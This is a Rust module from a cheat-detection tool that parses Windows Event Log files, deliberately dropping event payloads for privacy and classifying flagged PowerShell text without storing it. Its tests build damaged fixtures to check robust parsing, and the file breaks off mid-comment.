// SPDX-FileCopyrightText: 2026 aeterna-rongroi contributors
// SPDX-License-Identifier: GPL-3.0-or-later
// Part of aeterna-rongroi, a cheat-detection tool. Using it to evade detection is out of scope — see AGENTS.md.

//! Windows Event Log (`.evtx`) files.
//!
//! Windows writes these to `%SystemRoot%\System32\winevt\Logs`. Reading one — which for the
//! `Security` channel needs an elevated token — and deciding that an absent or unreadable log is
//! `Unmeasured` rather than empty is a collector's job; this module is handed the bytes of one file.
//!
//! # This module assigns no meaning to any event
//!
//! Every record is handed back with its event id, channel, provider and level exactly as the file
//! spelled them. **Which id means what is a rule's judgement, not a parser's** — including the ids
//! that say a log was cleared. Deciding that here would put a verdict inside a decoder, where no
//! rule file could be read to see it and no fixture could contradict it (ADR 0002).
//!
//! # A damaged chunk costs its own records and nothing else
//!
//! An `.evtx` file is a 4 KiB header followed by 64 KiB chunks, each holding its own records and its
//! own string table. [`records`] returns an [`EvtxFile`]: the records that parsed, plus a
//! [`RejectedRecord`] for each chunk or record that did not, in the shape [`crate::pca::PcaFile`]
//! already set. A partially overwritten log is exactly when the surviving records matter most, so one
//! bad chunk is accounted for rather than thrown, and the whole file is refused only when the header
//! says these are not Event Log bytes at all.
//!
//! # What this parser keeps, and what it deliberately does not
//!
//! A record's `System` block — the record id, the time it was written, the event id, the channel, the
//! provider and the level — is kept. **The event's payload is not**, and this is the one place in
//! this crate where something read is dropped on purpose rather than kept unnamed as
//! [`crate::bam::BamEntry::unparsed_tail`] is.
//!
//! The reason is that the payload is the artifact's personal data: `EventData` carries user names,
//! host names, source addresses, SIDs and full command lines, and so does the `Computer` field of
//! every record. Keeping it would put all of that one `Debug` away from a report, and
//! `rongroi_core::view` redacts a `path` field — it cannot redact an arbitrary event payload it has
//! no schema for. Nothing that reads this parser needs the payload: the tamper signals M2 is after
//! are the presence, identity and time of a record. **This is a real loss and is stated rather than
//! implied** — a later rule that needs a payload field has to widen this struct deliberately, which
//! is the review that decision deserves (ADR 0018).
//!
//! **One exception, by ADR 0064:** [`powershell_text`] reads the payload of exactly two kinds of event —
//! a script block Windows PowerShell flagged, and the command line it was started with — and hands each
//! straight to [`crate::powershell_text::classify`], which keeps kinds and at most a host, never the text.
//! [`records`] is unchanged and still reads no payload; only a full scan's collector calls the other.
//!
//! # The dependency's types stop here
//!
//! Binary XML, the chunk layout, the string tables and the recovery of records around a damaged chunk
//! come from the `evtx` crate rather than from code in this repository (ADR 0018). Nothing of that
//! crate appears in a signature outside this module: [`records`] takes `&[u8]` and returns this
//! crate's own types and [`ParseError`], exactly as [`crate::bam`], [`crate::pca`] and
//! [`crate::prefetch`] do.
//!
//! # The timestamp does not come from [`crate::filetime`]
//!
//! Every other parser here converts a raw `FILETIME` through the crate's one tested conversion and
//! keeps the raw `u64` beside it. This one cannot: `evtx` converts a record's `FILETIME` internally
//! and hands back an already-converted instant, so the raw value never reaches this code to be kept
//! or re-converted. A record whose timestamp that conversion rejects becomes a rejected record rather
//! than a record with no time.

use std::io::Cursor;

use evtx::EvtxParser;
use evtx::SerializedEvtxRecord;
use evtx::err::EvtxError;
use jiff::Timestamp;
use serde_json::Value;

use crate::error::ParseError;

/// The fixed header block every `.evtx` file begins with, and so the smallest input that could be
/// one. The header is read whole before anything else, so a shorter file is truncated rather than
/// malformed, whatever its first bytes say.
const FILE_HEADER_LEN: usize = 4096;

/// What one Event Log file yielded: the records that parsed, and an account of what did not.
///
/// `rejected` being empty is the only thing that says a file was intact. A caller that looks only at
/// `records` sees a shorter log, not a damaged one, which is why the two are returned together rather
/// than the failures being dropped — the same shape [`crate::pca::PcaFile`] holds (ADR 0013).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EvtxFile {
    /// The records that parsed, in the order the file had them.
    pub records: Vec<EvtxRecord>,
    /// One entry for each chunk or record that did not parse, in the order they were reached.
    pub rejected: Vec<RejectedRecord>,
}

/// One event record's identity: who wrote it, when, on which channel, and under which id.
///
/// The event's payload is not here; see the module documentation for why.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EvtxRecord {
    /// The record's own identifier, as the file stored it.
    ///
    /// Windows assigns these in increasing order within a log, so a gap is visible to whatever reads
    /// this — which is a fact about the file, and not a judgement this module makes.
    pub record_id: u64,
    /// When the record was written, in UTC.
    ///
    /// Converted by the `evtx` crate rather than by [`crate::filetime`], because the raw `FILETIME`
    /// never reaches this code; see the module documentation.
    pub written: Timestamp,
    /// The event id, exactly as the record spelled it, with no meaning attached to the number.
    ///
    /// `None` when the record carries no readable event id — a damaged record, not a zero one. The
    /// field renders either as a bare number or as an object with a `Qualifiers` attribute, and both
    /// are read.
    pub event_id: Option<u32>,
    /// The channel name, e.g. `Security` or `Microsoft-Windows-LanguagePackSetup/Operational`.
    ///
    /// `None` when the record has no channel element at all, which a damaged record may not.
    pub channel: Option<String>,
    /// The provider name, e.g. `Microsoft-Windows-Security-Auditing`.
    ///
    /// `None` when the record names no provider. This is the provider's own name as Windows records
    /// it, not a path or a user-supplied string.
    pub provider: Option<String>,
    /// The severity level the provider assigned, as the raw number.
    ///
    /// Windows uses 1 (critical) through 5 (verbose) with 0 meaning undefined, but no meaning is
    /// attached here: the number is passed on as it was read.
    pub level: Option<u8>,
}

/// A chunk or a record that did not parse.
///
/// The numbers are carried as typed fields rather than written into the error message, because
/// [`ParseError::Malformed`]'s `detail` promises to contain nothing read from the machine — and a
/// chunk number and a record id are both read from the file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RejectedRecord {
    /// Which chunk failed, counting from 0, when the failure was a chunk's.
    ///
    /// `None` when the failure was a single record's rather than a whole chunk's.
    pub chunk_number: Option<u64>,
    /// Which record failed, when the failure named one.
    pub record_id: Option<u64>,
    /// Why it did not parse.
    pub reason: ParseError,
}

/// Which step failed, so that the same upstream error maps to the field that describes it.
///
/// The upstream crate reports a malformed header and a malformed record through one variant, so
/// without this a bad record would be labelled a bad signature.
#[derive(Debug, Clone, Copy)]
enum Stage {
    /// Reading the file header, before any chunk.
    Header,
    /// Reading one chunk or one record out of it.
    Record,
}

/// Parses one Event Log file, returning the records that parsed and an account of what did not.
///
/// A chunk or record that does not parse is recorded in [`EvtxFile::rejected`]; it does not fail the
/// file. A file with a valid header and no records at all — which is what a log looks like after it
/// has been cleared — is an empty [`EvtxFile`], not an error.
///
/// # Errors
///
/// [`ParseError::Truncated`] when the input is shorter than the 4 KiB header block, which is too
/// short to be this artifact whatever its contents.
///
/// [`ParseError::Malformed`] with field `signature` when the header does not parse, which means these
/// are not Event Log bytes, and with field `header` when the header describes a file larger than the
/// bytes supplied.
///
/// No error carries anything read from the file: `detail` is a fixed sentence in every case, so an
/// error message is safe to show in either mode (see [`ParseError::Malformed`]).
pub fn records(bytes: &[u8]) -> Result<EvtxFile, ParseError> {
    if bytes.len() < FILE_HEADER_LEN {
        return Err(ParseError::Truncated {
            expected: FILE_HEADER_LEN,
            found: bytes.len(),
        });
    }

    // A `Cursor` over the caller's bytes rather than `EvtxParser::from_buffer`, which takes an owned
    // `Vec` and would copy the whole log. The crate's filesystem entry point is never used.
    let mut parser = EvtxParser::from_read_seek(Cursor::new(bytes))
        .map_err(|error| to_parse_error(&error, Stage::Header))?;

    let mut records = Vec::new();
    let mut rejected = Vec::new();
    for outcome in parser.records_json_value() {
        match outcome {
            Ok(parsed) => records.push(record(&parsed)),
            Err(error) => rejected.push(RejectedRecord {
                chunk_number: failed_chunk(&error),
                record_id: failed_record(&error),
                reason: to_parse_error(&error, Stage::Record),
            }),
        }
    }

    Ok(EvtxFile { records, rejected })
}

/// Takes the four `System` fields this parser keeps out of one rendered record and drops the rest.
///
/// The record's payload and `Computer` field pass through this function and are not stored; see the
/// module documentation.
fn record(parsed: &SerializedEvtxRecord<Value>) -> EvtxRecord {
    let system = parsed
        .data
        .get("Event")
        .and_then(|event| event.get("System"));

    EvtxRecord {
        record_id: parsed.event_record_id,
        written: parsed.timestamp,
        event_id: system
            .and_then(|system| system.get("EventID"))
            .map(scalar)
            .and_then(number)
            .and_then(|value| u32::try_from(value).ok()),
        channel: system
            .and_then(|system| system.get("Channel"))
            .and_then(text),
        level: system
            .and_then(|system| system.get("Level"))
            .map(scalar)
            .and_then(number)
            .and_then(|value| u8::try_from(value).ok()),
        provider: system
            .and_then(|system| system.get("Provider"))
            .and_then(|provider| provider.get("#attributes"))
            .and_then(|attributes| attributes.get("Name"))
            .and_then(text),
    }
}

/// An element that carries XML attributes renders as an object with its value under `#text`; the same
/// element without attributes renders as the value itself. `EventID` appears both ways in one file,
/// so both are read rather than the second shape being lost.
fn scalar(value: &Value) -> &Value {
    value.get("#text").unwrap_or(value)
}

/// Some providers render these fields as JSON strings rather than numbers. `"4"` and `4` are the same
/// level, so both are read; anything that is neither is `None` rather than a guess.
fn number(value: &Value) -> Option<u64> {
    if let Some(number) = value.as_u64() {
        return Some(number);
    }
    value.as_str()?.parse().ok()
}

fn text(value: &Value) -> Option<String> {
    Some(value.as_str()?.to_owned())
}

/// The chunk number an error names, when it names one. Not put in the error message: it is read from
/// the file, and `detail` carries nothing that was.
fn failed_chunk(error: &EvtxError) -> Option<u64> {
    match error {
        EvtxError::FailedToParseChunk { chunk_id, .. } => Some(*chunk_id),
        _ => None,
    }
}

/// The record id an error names, when it names one.
fn failed_record(error: &EvtxError) -> Option<u64> {
    match error {
        EvtxError::FailedToParseRecord { record_id, .. } => Some(*record_id),
        _ => None,
    }
}

/// Maps the Event Log crate's error into this crate's, which is where that type stops.
///
/// **Every `detail` is a fixed sentence and nothing read from the file is forwarded.** That matters
/// more here than anywhere else in this crate: an event record is full of user names, host names and
/// command lines, and the upstream `Display` implementations quote a chunk number, a record number, a
/// declared data size and — in `CalculationError` — a message built from the file's own values. The
/// numbers that are worth keeping are carried as typed fields of [`RejectedRecord`] instead.
///
/// The match is exhaustive on purpose: `EvtxError` is not `#[non_exhaustive]`, so a variant added
/// upstream is a compile error here rather than a wildcard arm that silently mislabels it — the same
/// reasoning ADR 0013 applied to `ParseError` itself.
fn to_parse_error(error: &EvtxError, stage: Stage) -> ParseError {
    match error {
        // Reading the header of a file that is long enough to hold one failed, so these are not
        // Event Log bytes; the same variant during record reading is a record that did not decode.
        EvtxError::DeserializationError(_) => match stage {
            Stage::Header => ParseError::Malformed {
                field: "signature",
                detail: "not an Event Log file: the file header did not parse".to_owned(),
            },
            Stage::Record => ParseError::Malformed {
                field: "record",
                detail: "a record's binary XML did not decode".to_owned(),
            },
        },
        EvtxError::FailedToParseChunk { .. } => ParseError::Malformed {
            field: "chunk",
            detail: "a chunk did not parse; the records it held were not read".to_owned(),
        },
        EvtxError::FailedToParseRecord { .. } => ParseError::Malformed {
            field: "record",
            detail: "a record did not parse".to_owned(),
        },
        EvtxError::InvalidDataSize { .. } => ParseError::Malformed {
            field: "record",
            detail: "a record declares a size smaller than its own header".to_owned(),
        },
        EvtxError::CalculationError(_) => ParseError::Malformed {
            field: "header",
            detail: "the file header describes a file larger than the bytes supplied".to_owned(),
        },
        EvtxError::SerializationError(_) => ParseError::Malformed {
            field: "record",
            detail: "a record decoded but could not be rendered".to_owned(),
        },
        EvtxError::FailedToCreateRecordModel(_) => ParseError::Malformed {
            field: "record",
            detail: "a record's element structure is not a well formed event".to_owned(),
        },
        EvtxError::Unimplemented { .. } => ParseError::Malformed {
            field: "record",
            detail: "a record uses a binary XML feature this parser does not read".to_owned(),
        },
        // Neither can arise from the in-memory cursor this module reads: no file is opened and the
        // bytes are all present. They are mapped rather than ignored so that the match stays
        // exhaustive and a future call path cannot reach an arm that does not exist.
        EvtxError::InputError(_) | EvtxError::IoError(_) => ParseError::Malformed {
            field: "input",
            detail: "the log could not be read".to_owned(),
        },
    }
}

// ---------------------------------------------------------------------------------------------------
// PowerShell's text, classified where it is read (ADR 0064, widening ADR 0018 for two kinds of event)
// ---------------------------------------------------------------------------------------------------

/// The provider, channel, event id and level of a block Windows PowerShell flagged (ADR 0063, ADR 0064).
const SCRIPT_BLOCK: (&str, &str, u32, u8) = (
    "Microsoft-Windows-PowerShell",
    "Microsoft-Windows-PowerShell/Operational",
    4104,
    3,
);

/// The provider, channel and event id of Windows PowerShell's "engine state changed to Available".
const ENGINE_START: (&str, &str, u32) = ("PowerShell", "Windows PowerShell", 400);

/// The most text one script block may gather from its parts before the rest is not added.
const BLOCK_TEXT_MAX: usize = 4 * 1024 * 1024;

/// The most blocks waiting for their remaining parts at one time.
const PENDING_MAX: usize = 1024;

/// Which of the two kinds of event an entry came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PowerShellSource {
    /// 4104 at level 3: a script block Windows PowerShell flagged as suspicious, all its parts joined.
    ScriptBlock,
    /// 400: the command line Windows PowerShell was started with.
    EngineStart,
}

/// One script block or one start, classified. **No text of it is here** (ADR 0064 section 1).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PowerShellEntry {
    /// Which kind of event.
    pub source: PowerShellSource,
    /// When the record was written; for a block in parts, the last part read.
    pub written: Timestamp,
    /// What it held, as kinds.
    pub classification: crate::powershell_text::Classification,
    /// `false` for a block some of whose parts the log no longer holds, or whose text passed the size
    /// limit; it was classified from the parts there were.
    pub complete: bool,
}

/// What [`powershell_text`] read from one log.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct PowerShellText {
    /// One entry per script block and per start, in the order their last record was read.
    pub entries: Vec<PowerShellEntry>,
    /// Records of the two kinds this function reads; every other record is passed over unread.
    pub examined: usize,
    /// Chunks or records that did not parse, as [`records`] reports them.
    pub rejected: Vec<RejectedRecord>,
}

/// Classifies the text of every flagged script block and the command line of every start in one log,
/// keeping no text (ADR 0064). Every other record is identified and skipped, its payload never read.
///
/// This is the only function in this crate that reads an event payload, and it reads exactly two:
/// `ScriptBlockText` of 4104 at level 3 from `Microsoft-Windows-PowerShell`, and `HostApplication` of
/// 400 from `PowerShell` — each recognised by provider, channel and id together (ADR 0031). The text is
/// handed to [`crate::powershell_text::classify`] inside this function and dropped.
///
/// # Errors
///
/// As [`records`].
pub fn powershell_text(bytes: &[u8]) -> Result<PowerShellText, ParseError> {
    if bytes.len() < FILE_HEADER_LEN {
        return Err(ParseError::Truncated {
            expected: FILE_HEADER_LEN,
            found: bytes.len(),
        });
    }
    let mut parser = EvtxParser::from_read_seek(Cursor::new(bytes))
        .map_err(|error| to_parse_error(&error, Stage::Header))?;
    let mut out = PowerShellText::default();
    let mut pending = Pending::default();
    for outcome in parser.records_json_value() {
        match outcome {
            Ok(parsed) => read_powershell_record(&parsed, &mut out, &mut pending),
            Err(error) => out.rejected.push(RejectedRecord {
                chunk_number: failed_chunk(&error),
                record_id: failed_record(&error),
                reason: to_parse_error(&error, Stage::Record),
            }),
        }
    }
    pending.flush_all(&mut out.entries);
    Ok(out)
}

/// One block's parts as they arrive. The block's id is the map key and never leaves this module.
#[derive(Debug, Default)]
struct PartialBlock {
    parts: std::collections::BTreeMap<u64, String>,
    total: u64,
    size: usize,
    truncated: bool,
    last_written: Option<Timestamp>,
    order: u64,
}

#[derive(Debug, Default)]
struct Pending {
    blocks: std::collections::HashMap<String, PartialBlock>,
    next_order: u64,
}

impl Pending {
    fn add(
        &mut self,
        id: &str,
        number: u64,
        total: u64,
        text: String,
        written: Timestamp,
        out: &mut Vec<PowerShellEntry>,
    ) {
        if self.blocks.len() >= PENDING_MAX && !self.blocks.contains_key(id) {
            self.flush_oldest(out);
        }
        let order = self.next_order;
        let block = self
            .blocks
            .entry(id.to_owned())
            .or_insert_with(|| PartialBlock {
                order,
                ..PartialBlock::default()
            });
        self.next_order += 1;
        block.total = block.total.max(total.max(1));
        block.last_written = Some(written);
        if block.size.saturating_add(text.len()) > BLOCK_TEXT_MAX {
            block.truncated = true;
        } else {
            block.size += text.len();
            block.parts.insert(number, text);
        }
        let done = u64::try_from(block.parts.len()).unwrap_or(u64::MAX) >= block.total;
        if (done || block.truncated && number >= block.total)
            && let Some(block) = self.blocks.remove(id)
        {
            out.push(finish(block));
        }
    }

    fn flush_oldest(&mut self, out: &mut Vec<PowerShellEntry>) {
        let oldest = self
            .blocks
            .iter()
            .min_by_key(|(_, b)| b.order)
            .map(|(id, _)| id.clone());
        if let Some(block) = oldest.and_then(|id| self.blocks.remove(&id)) {
            out.push(finish(block));
        }
    }

    fn flush_all(&mut self, out: &mut Vec<PowerShellEntry>) {
        let mut rest: Vec<PartialBlock> = self.blocks.drain().map(|(_, b)| b).collect();
        rest.sort_by_key(|b| b.order);
        out.extend(rest.into_iter().map(finish));
    }
}

fn finish(block: PartialBlock) -> PowerShellEntry {
    let complete =
        !block.truncated && u64::try_from(block.parts.len()).unwrap_or(u64::MAX) >= block.total;
    let text: String = block.parts.into_values().collect();
    PowerShellEntry {
        source: PowerShellSource::ScriptBlock,
        written: block.last_written.unwrap_or(Timestamp::UNIX_EPOCH),
        classification: crate::powershell_text::classify(&text),
        complete,
    }
}

fn read_powershell_record(
    parsed: &SerializedEvtxRecord<Value>,
    out: &mut PowerShellText,
    pending: &mut Pending,
) {
    let identity = record(parsed);
    let is = |provider: &str, channel: &str, id: u32| {
        identity.provider.as_deref() == Some(provider)
            && identity.channel.as_deref() == Some(channel)
            && identity.event_id == Some(id)
    };
    let data = parsed
        .data
        .get("Event")
        .and_then(|event| event.get("EventData"));
    if is(SCRIPT_BLOCK.0, SCRIPT_BLOCK.1, SCRIPT_BLOCK.2) && identity.level == Some(SCRIPT_BLOCK.3)
    {
        out.examined += 1;
        let field = |name: &str| data.and_then(|d| d.get(name)).map(scalar);
        let text = field("ScriptBlockText")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_owned();
        let part = field("MessageNumber").and_then(number).unwrap_or(1);
        let total = field("MessageTotal").and_then(number).unwrap_or(1);
        // A block with no id cannot be joined with its other parts, so it stands alone.
        let id = field("ScriptBlockId").and_then(Value::as_str).map_or_else(
            || format!("\u{0}record-{}", parsed.event_record_id),
            str::to_owned,
        );
        pending.add(&id, part, total, text, parsed.timestamp, &mut out.entries);
    } else if is(ENGINE_START.0, ENGINE_START.1, ENGINE_START.2) {
        out.examined += 1;
        let command = data.and_then(host_application).unwrap_or_default();
        out.entries.push(PowerShellEntry {
            source: PowerShellSource::EngineStart,
            written: parsed.timestamp,
            classification: crate::powershell_text::classify(&command),
            complete: true,
        });
    }
}

/// `HostApplication=…` from a classic 400's data strings, wherever the rendering put them: a list, a
/// list under `#text`, or one string.
fn host_application(data: &Value) -> Option<String> {
    let mut found = None;
    walk_strings(data, &mut |s| {
        if found.is_none()
            && let Some(at) = s.find("HostApplication=")
        {
            let rest = s.get(at + "HostApplication=".len()..).unwrap_or("");
            let line = rest.split(['\r', '\n']).next().unwrap_or("");
            found = Some(line.trim().to_owned());
        }
    });
    found
}

fn walk_strings(value: &Value, f: &mut dyn FnMut(&str)) {
    match value {
        Value::String(s) => f(s),
        Value::Array(items) => items.iter().for_each(|v| walk_strings(v, f)),
        Value::Object(map) => map.values().for_each(|v| walk_strings(v, f)),
        _ => {}
    }
}

#[cfg(test)]
mod tests {
    use super::{EvtxFile, number, records, scalar};
    use crate::error::ParseError;

    /// 17 records, the last of them damaged: a truncated provider GUID and no channel at all. The
    /// only vendored Event Log sample: a second one was removed on finding it carried a real
    /// machine SID (`fixtures/evtx/PROVENANCE.md`), so every test here reads this file or bytes
    /// built from it.
    const LANGUAGE_PACK: &[u8] =
        include_bytes!("../../../fixtures/evtx/languagepacksetup-operational.evtx");

    /// The fixed file header every `.evtx` begins with.
    const FILE_HEADER_LEN: usize = 4096;
    /// One chunk. The fixture is a single chunk behind the header.
    const CHUNK_LEN: usize = 65536;

    fn parsed(bytes: &[u8]) -> EvtxFile {
        match records(bytes) {
            Ok(file) => file,
            Err(error) => panic!("expected the file to parse: {error}"),
        }
    }

    /// The same chunk twice behind one header, so that a test has a file where one chunk can be
    /// damaged and another survive it. Vendoring a real multi-chunk file would have cost 1 MB of a
    /// public repository and carried a real machine's logs with it (`fixtures/evtx/PROVENANCE.md`).
    fn two_chunk_file(source: &[u8]) -> Vec<u8> {
        let mut bytes = source[..FILE_HEADER_LEN + CHUNK_LEN].to_vec();
        bytes.extend_from_slice(&source[FILE_HEADER_LEN..FILE_HEADER_LEN + CHUNK_LEN]);
        bytes
    }

    /// Rewrites the first `string_table_name_len` in the fixture's chunk, which sits 595 bytes in.
    /// A `u16` there above 32767 is what overflowed upstream's `len * 2`. Built from good bytes in
    /// the test rather than vendored, the same way the damaged-chunk cases are.
    fn with_name_length(source: &[u8], length: u16) -> Vec<u8> {
        const NAME_LENGTH_OFFSET: usize = FILE_HEADER_LEN + 595;

        let mut bytes = source.to_vec();
        let found = u16::from_le_bytes([bytes[NAME_LENGTH_OFFSET], bytes[NAME_LENGTH_OFFSET + 1]]);
        assert_eq!(
            found, 5,
            "the fixture drifted: offset {NAME_LENGTH_OFFSET} no longer holds the name length this \
             helper rewrites, so the test below would prove nothing"
        );

        bytes[NAME_LENGTH_OFFSET..NAME_LENGTH_OFFSET + 2].copy_from_slice(&length.to_le_bytes());
        bytes
    }

    /// Rewrites the first record's `Provider` `Guid` substitution into a `SYSTEMTIME` whose
    /// milliseconds are `milliseconds`, leaving every other byte of the file alone.
    ///
    /// The first record's template instance carries 18 substitution descriptors, 1236 bytes into the
    /// record, which is 512 bytes into the chunk. The sixteenth is a 16-byte `GuidType` (`0x0f`), and
    /// a `SysTimeType` (`0x12`) is also 16 bytes, so changing the type byte and the value's bytes keeps
    /// every size and offset in the record what it was. The value is 2018-07-09T20:49:14, the time of
    /// the record itself, so the one field that varies is the milliseconds.
    fn with_systime_milliseconds(source: &[u8], milliseconds: u16) -> Vec<u8> {
        /// The sixteenth descriptor's type byte.
        const DESCRIPTOR_TYPE: usize = FILE_HEADER_LEN + 512 + 1236 + 4 + 15 * 4 + 2;
        /// The sixteenth substitution's value. Located by the provider GUID the record renders,
        /// `7237FFF9-A08A-4804-9C79-4A8704B70B87`, whose first field is stored little-endian.
        const VALUE: usize = FILE_HEADER_LEN + 512 + 1236 + 4 + 18 * 4 + 139;

        let mut bytes = source.to_vec();
        assert_eq!(
            (
                u16::from_le_bytes([bytes[DESCRIPTOR_TYPE - 2], bytes[DESCRIPTOR_TYPE - 1]]),
                bytes[DESCRIPTOR_TYPE]
            ),
            (16, 0x0f),
            "the fixture drifted: offset {DESCRIPTOR_TYPE} no longer holds the 16-byte GUID substitution \
             this helper rewrites, so the test below would prove nothing"
        );
        assert_eq!(
            bytes[VALUE..VALUE + 4],
            [0xf9, 0xff, 0x37, 0x72],
            "the fixture drifted: offset {VALUE} no longer holds the provider GUID this helper rewrites"
        );

        bytes[DESCRIPTOR_TYPE] = 0x12;
        let systime: [u16; 8] = [2018, 7, 1, 9, 20, 49, 14, milliseconds];
        for (i, field) in systime.iter().enumerate() {
            bytes[VALUE + 2 * i..VALUE + 2 * i + 2].copy_from_slice(&field.to_le_bytes());
        }
        bytes
    }

    /// Closes two of the chunk's string-table entries into a cycle. The table is a set of linked
    /// chains: each entry starts with the `u32` chunk offset of the next entry in its chain, then a
    /// `u16` hash, then the name. `ThreadID` sits 1523 bytes into the chunk and links to `Task` at
    /// 1052, which ends its chain with a zero; writing 1523 there closes the two into a loop.
    ///
    /// Built from good bytes here rather than vendored, the same way the damaged-chunk and
    /// name-length cases are — and here it is not only a preference: `fixtures/evtx/` is both the L0
    /// fixture set and the fuzz seed corpus, so everything in it has to parse (ADR 0021).
    fn with_cyclic_string_table(source: &[u8]) -> Vec<u8> {
        /// `ThreadID`'s entry, as an offset into the chunk.
        const FIRST: u32 = 1523;
        /// `Task`'s entry, which `FIRST` links to and which ends the chain.
        const SECOND: u32 = 1052;

        let next_entry = |bytes: &[u8], entry: u32| {
            let at = FILE_HEADER_LEN + entry as usize;
            u32::from_le_bytes([bytes[at], bytes[at + 1], bytes[at + 2], bytes[at + 3]])
        };

        let mut bytes = source.to_vec();
        assert_eq!(
            next_entry(&bytes, FIRST),
            SECOND,
            "the fixture drifted: the string-table entry at {FIRST} no longer links to {SECOND}, so \
             the test below would build something other than a cycle"
        );
        assert_eq!(
            next_entry(&bytes, SECOND),
            0,
            "the fixture drifted: the string-table entry at {SECOND} no longer ends its chain"
        );

        let at = FILE_HEADER_LEN + SECOND as usize;
        bytes[at..at + 4].copy_from_slice(&FIRST.to_le_bytes());
        bytes
    }

    /// Breaks one chunk's `ElfChnk\0` signature, leaving every other byte of the file alone.
    fn with_damaged_chunk(source: &[u8], chunk_number: usize) -> Vec<u8> {
        let mut bytes = two_chunk_file(source);
        let start = FILE_HEADER_LEN + chunk_number * CHUNK_LEN;
        bytes[start..start + 8].copy_from_slice(b"XlfChnk\0");
        bytes
    }

    #[test]
    fn a_normal_file_parses() {
        let file = parsed(LANGUAGE_PACK);

        assert!(file.rejected.is_empty());
        assert_eq!(file.records.len(), 17);
        let first = &file.records[0];
        assert_eq!(first.record_id, 1);
        assert_eq!(first.event_id, Some(4000));
        assert_eq!(first.level, Some(4));
        // Seven fractional digits, not the six the rendered `SystemTime` element shows: `written`
        // is the record header's own `FILETIME`, which has 100-nanosecond resolution, and not the
        // timestamp the XML prints. Pinned here so that a change of source would fail rather than
        // pass with a value that looks close enough.
        assert_eq!(first.written.to_string(), "2018-07-09T20:49:14.0577461Z");
    }

    /// `EventID` renders as a bare number when the element has no attributes, and as an object with
    /// the value under `#text` when it carries `Qualifiers`. A parser that reads only the first shape
    /// silently loses the event id of every record written the second way — the field a later rule
    /// reads.
    ///
    /// This is asserted against the two shapes directly rather than through a fixture. The sample
    /// that carried both in one file was removed for holding a real machine SID, and the surviving
    /// one renders only bare numbers; a test that reached for the object shape through it would pass
    /// while exercising nothing. `scalar` and `number` are the whole of that logic.
    #[test]
    fn an_event_id_is_read_whether_or_not_it_carries_qualifiers() {
        use serde_json::json;

        // The shape a record with `Qualifiers` renders as.
        let with_attributes = json!({"#attributes": {"Qualifiers": 0}, "#text": 1});
        assert_eq!(number(scalar(&with_attributes)), Some(1));

        // The shape a record without them renders as.
        let bare = json!(1532);
        assert_eq!(number(scalar(&bare)), Some(1532));

        // Some providers render these fields as JSON strings.
        assert_eq!(number(scalar(&json!("4"))), Some(4));
        assert_eq!(number(scalar(&json!({"#text": "4000"}))), Some(4000));

        // Anything that is neither is `None` rather than a guess.
        assert_eq!(number(scalar(&json!("not a number"))), None);
        assert_eq!(number(scalar(&json!(null))), None);

        let file = parsed(LANGUAGE_PACK);
        assert!(
            file.records.iter().all(|record| record.event_id.is_some()),
            "every record in this fixture has an event id"
        );
    }

    #[test]
    fn a_provider_specific_channel_is_kept_verbatim() {
        let file = parsed(LANGUAGE_PACK);

        assert_eq!(file.records.len(), 17);
        assert_eq!(
            file.records[0].channel.as_deref(),
            Some("Microsoft-Windows-LanguagePackSetup/Operational")
        );
        assert_eq!(
            file.records[0].provider.as_deref(),
            Some("Microsoft-Windows-LanguagePackSetup")
        );
    }

    /// The last record of this fixture is damaged — its provider GUID is truncated and it has no
    /// `Channel` element. It still parses, and the fields that are missing are `None` rather than
    /// invented or defaulted.
    #[test]
    fn a_record_with_fields_missing_keeps_the_fields_it_has() {
        let file = parsed(LANGUAGE_PACK);

        let last = &file.records[16];
        assert_eq!(last.channel, None, "this record has no Channel element");
        assert_eq!(last.event_id, Some(4000));
        assert_eq!(
            last.provider.as_deref(),
            Some("Microsoft-Windows-LanguagePackSetup")
        );
    }

    /// The headline requirement: a damaged chunk costs its own records and nothing else. A
    /// partially-overwritten log is exactly when the surviving records matter most.
    #[test]
    fn a_damaged_chunk_does_not_lose_the_rest_of_the_file() {
        let intact = parsed(&two_chunk_file(LANGUAGE_PACK));
        assert_eq!(intact.records.len(), 34, "both chunks parse when undamaged");
        assert!(intact.rejected.is_empty());

        let file = parsed(&with_damaged_chunk(LANGUAGE_PACK, 1));

        assert_eq!(file.records.len(), 17, "the intact chunk's records survive");
        assert_eq!(file.rejected.len(), 1);
        assert_eq!(file.rejected[0].chunk_number, Some(1));
        assert!(matches!(
            file.rejected[0].reason,
            ParseError::Malformed { field: "chunk", .. }
        ));
    }

    /// The same, with the damage first: a file is not read only up to its first bad chunk.
    #[test]
    fn a_damaged_first_chunk_does_not_hide_the_records_after_it() {
        let file = parsed(&with_damaged_chunk(LANGUAGE_PACK, 0));

        assert_eq!(file.records.len(), 17);
        assert_eq!(file.rejected.len(), 1);
        assert_eq!(file.rejected[0].chunk_number, Some(0));
    }

    /// A name's length is a `u16` read from the file, and upstream multiplied it by two *before*
    /// widening it, so any length above 32767 overflowed. Where overflow checks are on — a test
    /// build, a fuzz build — that is a panic. In a release build it wraps silently, `data_size`
    /// comes out short, and the cursor is left in the wrong place with nothing reporting it, which
    /// is the worse of the two. The vendored crate widens first
    /// (`third_party/evtx/PROVENANCE.md`), so an implausible length becomes an out-of-range seek
    /// and the chunk is refused like any other damaged chunk.
    ///
    /// Found by `fuzz_evtx` on `dev`, not on the pull request that introduced it: the fuzzer takes a
    /// random seed, so one green run is not evidence about the next. This test is deterministic.
    #[test]
    fn a_name_length_that_overflows_its_field_is_refused_rather_than_wrapped() {
        let file = parsed(&with_name_length(LANGUAGE_PACK, u16::MAX));

        assert!(
            file.records.is_empty(),
            "the chunk carrying the bad name holds every record in this fixture"
        );
        assert_eq!(file.rejected.len(), 1);
        assert!(matches!(
            file.rejected[0].reason,
            ParseError::Malformed { field: "chunk", .. }
        ));
    }

    /// A `SYSTEMTIME`'s milliseconds are a `u16` read from the file, and upstream multiplied them by
    /// a million in `u32`, so any value above 4294 overflowed. Where overflow checks are on — a test
    /// build, a fuzz build — that is a panic. In a release build it wraps silently, and the wrapped
    /// nanoseconds reach `DateTime::new`. Microsoft documents the field as "0 through 999"
